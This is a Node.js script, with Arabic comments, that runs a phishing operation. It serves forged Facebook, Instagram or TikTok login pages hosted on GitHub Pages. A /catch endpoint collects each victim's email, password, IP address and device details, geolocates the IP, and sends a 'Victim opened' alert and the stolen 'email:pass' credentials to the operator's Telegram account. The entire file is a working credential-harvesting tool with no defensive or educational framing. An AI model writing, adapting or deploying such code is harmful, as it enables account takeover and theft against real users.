#!/usr/bin/env node
const express=require('express')
const {Telegraf}=require('telegraf')
const axios=require('axios')
const ua=require('ua-parser-js')
const readline=require('readline')

const rl=readline.createInterface({input:process.stdin,output:process.stdout})
const ask=q=>new Promise(res=>rl.question(q,ans=>res(ans)))

const PAGES={                      // عدّلها لحسابك الثانوي
  fb:'https://mosmanhacker.github.io/fb',
  ig:'https://YOUR_2ND.github.io/ig',
  tt:'https://YOUR_2ND.github.io/tt'
}

async function main(){
  const TOKEN=process.env.TOKEN||await ask('BOT_TOKEN: ')
  const MASTER=process.env.MASTER||await ask('MASTER_ID: ')

  console.log('\n1- Facebook\n2- Instagram\n3- TikTok')
  const c=(await ask('Select page (1-3): ')).trim()
  const p=['fb','ig','tt'][parseInt(c)-1]||'fb'

  rl.close()                       // أغلق بعد آخر سؤال

  require('fs').writeFileSync('.env',`TOKEN=${TOKEN}\nMASTER=${MASTER}`)

  const bot=new Telegraf(TOKEN)
  const app=express()
  app.use(express.json({limit:'1mb'}))
  app.use(express.urlencoded({extended:true}))

  // رسالة اتصال تلقائية
  bot.telegram.sendMessage(MASTER,`Successful connection..!`).catch(()=>{})

  const ext=`${PAGES[p]}/?id=${MASTER}`
  const int=`http://localhost:3000/${p}`
  console.log(`\nExternal: ${ext}\nInternal: ${int}\n`)

  // الرابط الداخلي يستعرض نفس الصفحة المزورة
  app.get(`/${p}`,async(_,res)=>{
    try{
      const{data}=await axios.get(`${PAGES[p]}/index.html`)
      res.send(data.replace('{{ID}}',MASTER))
    }catch{res.send('Page not found')}
  })

  // استقبال بيانات الضحية
  app.post('/catch',async(q,r)=>{
    const{id,email,pass,ua:s,ip}=q.body
    const dev=ua(s)
    const geo=await axios.get(`http://ip-api.com/json/${ip}`).catch(()=>({data:{}}))
    const msg=
      `🔥 Victim opened\n`+
      `Platform: ${p}\n`+
      `IP: ${ip}\n`+
      `Country: ${geo.data.country||'?'}\n`+
      `Device: ${dev.os.name||'?'} ${dev.device.model||''}\n`+
      `Browser: ${dev.browser.name||'?'}`
    await bot.telegram.sendMessage(id,msg).catch(()=>{})
    if(email&&pass){
      await bot.telegram.sendMessage(id,`✅ Login: ${email}:${pass}`).catch(()=>{})
    }
    r.sendStatus(200)
  })

  bot.launch()
  app.listen(3000,()=>console.log('Running... (Ctrl+C to stop)\n'))
}
main()
